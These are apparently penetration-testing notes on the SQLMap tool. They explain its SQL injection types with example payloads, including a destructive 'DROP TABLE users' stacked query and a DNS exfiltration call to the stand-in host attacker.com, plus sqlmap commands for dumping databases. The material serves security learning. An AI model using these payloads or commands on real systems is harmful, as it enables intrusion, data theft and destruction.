\section{SQLMap}
\label{tool:sqlmap}

\subsection*{Introduction}

\href{https://github.com/sqlmapproject/sqlmap}{SQLMap} is a free and
open-source penetration testing tool written in Python that automates the
process of detecting and exploiting SQL injection (SQLi) flaws. 

\subsection*{Supported SQL injection types}

\begin{verbatim}
sqlmap -hh
\end{verbatim}

\subsubsection*{Boolean-based blind SQL injection}

\verb+AND 1=1+

SQLMap exploits Boolean-based blind SQL Injection vulnerabilities through the
differentiation of TRUE from FALSE query results, effectively retrieving 1 byte
of information per request. The differentiation is based on comparing server
responses to determine whether the SQL query returned TRUE or FALSE. This
ranges from fuzzy comparisons of raw response content, HTTP codes, page titles,
filtered text, and other factors.

\begin{itemize}
    \item TRUE results are generally based on responses having none or marginal
        difference to the regular server response.
    \item FALSE results are based on responses having substantial differences
        from the regular server response.
\end{itemize}

Boolean-based blind SQL Injection is considered as the {\bf most common} SQLi
type in web applications.

\subsubsection*{Error-based SQL injection}


\verb+AND GTID_SUBSET(@@version,0)+

If the database management system (DBMS) errors are being returned as part of
the server response for any database-related problems, then there is a
probability that they can be used to carry the results for requested queries.
In such cases, specialized payloads for the current DBMS are used, targeting
the functions that cause known misbehaviors. SQLMap has the most comprehensive
list of such related payloads and covers Error-based SQL Injection for the
following DBMSes:

\begin{tabular}{lll}
MySQL &	PostgreSQL &	Oracle \\
Microsoft SQL Server &	Sybase 	& Vertica \\
IBM DB2 &	Firebird &	MonetDB \\
\end{tabular}

Error-based SQLi is considered as {\bf faster than all other types, except
UNION query-based }, because it can retrieve a limited amount (e.g., 200 bytes)
of data called "chunks" through each request.

\subsubsection*{UNION query-based}
\verb+UNION ALL SELECT 1,@@version,3+

With the usage of UNION, it is generally possible to extend the original
(vulnerable) query with the injected statements' results. This way, if the
original query results are rendered as part of the response, the attacker can
get additional results from the injected statements within the page response
itself. 

This type of SQL injection is considered the fastest, as, in the ideal
scenario, the attacker would be able to pull the content of the whole database
table of interest with a single request.


\subsubsection*{Stacked queries}

\verb+; DROP TABLE users+

Stacking SQL queries, also known as the "piggy-backing," is the form of
injecting additional SQL statements after the vulnerable one. In case that
there is a requirement for running non-query statements (e.g. INSERT, UPDATE or
DELETE), stacking must be supported by the vulnerable platform (e.g., Microsoft
SQL Server and PostgreSQL support it by default). SQLMap can use such
vulnerabilities to run non-query statements executed in advanced features
(e.g., execution of OS commands) and data retrieval similarly to time-based
blind SQLi types.

\subsubsection*{Time-based blind SQL injection}

\verb+AND 1=IF(2>1,SLEEP(5),0)+

The principle of Time-based blind SQL Injection is similar to the Boolean-based
blind SQL Injection, but here the response time is used as the source for the
differentiation between TRUE or FALSE.
\begin{itemize}
    \item TRUE response is generally characterized by the noticeable difference
        in the response time compared to the regular server response
    \item FALSE response should result in a response time indistinguishable
        from regular response times
\end{itemize}

Time-based blind SQL Injection is considerably slower than the boolean-based
blind SQLi, since queries resulting in TRUE would delay the server response.
This SQLi type is used in cases where Boolean-based blind SQL Injection is not
applicable. For example, in case the vulnerable SQL statement is a non-query
(e.g. INSERT, UPDATE or DELETE), executed as part of the auxiliary
functionality without any effect to the page rendering process, time-based SQLi
is used out of the necessity, as Boolean-based blind SQL Injection would not
really work in this case.

\subsubsection*{Inline queries}
\verb+SELECT (SELECT @@version) from+

This type of injection embedded a query within the original query. Such SQL
injection is uncommon, as it needs the vulnerable web app to be written in a
certain way. Still, SQLMap supports this kind of SQLi as well.

\subsubsection*{Out-of-band SQL injection}

\verb+LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))+

This is considered one of the most advanced types of SQLi, used in cases where
all other types are either unsupported by the vulnerable web application or are
too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi
through "DNS exfiltration," where requested queries are retrieved through DNS
traffic.

By running the SQLMap on the DNS server for the domain under control (e.g.
.attacker.com), SQLMap can perform the attack by forcing the server to request
non-existent subdomains (e.g. foo.attacker.com), where foo would be the SQL
response we want to receive. SQLMap can then collect these erroring DNS
requests and collect the foo part, to form the entire SQL response.



\subsection*{Building attacks}
\subsubsection*{Set up an SQLMap request}

One of the best and easiest ways to properly set up an SQLMap request against
the specific target (i.e., web request with parameters inside) is by utilizing
Copy as cURL feature from within the Network (Monitor) panel inside web browser

When providing data for testing to SQLMap, there has to be either a parameter
value that could be assessed for SQLi vulnerability or specialized
options/switches for automatic parameter finding (e.g. \verb+--crawl+,
    \verb+--forms+ or \verb+-g+).

\subsubsection*{GET/POST requests}

In the most common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

\begin{verbatim}
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
\end{verbatim}


In such cases, POST parameters uid and name will be tested for SQLi
vulnerability. For example, if we have a clear indication that the parameter
uid is prone to an SQLi vulnerability, we could narrow down the tests to only
this parameter using \verb+-p uid+. Otherwise, we could mark it inside the provided
data with the usage of special marker \verb+*+ as follows:

\begin{verbatim}
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
\end{verbatim}

\subsubsection*{Full HTTP Requests}
If we need to specify a complex HTTP request with lots of different header
values and an elongated POST body, we can use the i\verb+-r+ flag. With this option,
SQLMap is provided with the "request file," containing the whole HTTP request
inside a single textual file. In a common scenario, such HTTP request can be
captured from within a specialized proxy application (e.g. Burp) and written
into the request file.
\begin{verbatim}
sqlmap -r req.txt
\end{verbatim}

\subsubsection*{Custom SQLMap Requests}

While SQLMap, by default, targets only the HTTP parameters, it is possible to
test the headers for the SQLi vulnerability. The easiest way is to specify the
"custom" injection mark after the header's value (e.g. \verb+--cookie="id=1*"+). The
same principle applies to any other part of the request.

\subsection*{Common usages}

\subsubsection*{Script kiddy}
\begin{verbatim}
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
\end{verbatim}



\subsection*{options}

\begin{itemize}
    \item \verb+--batch+: no user interaction
    \item \verb+--dump+: dump all data
\end{itemize}
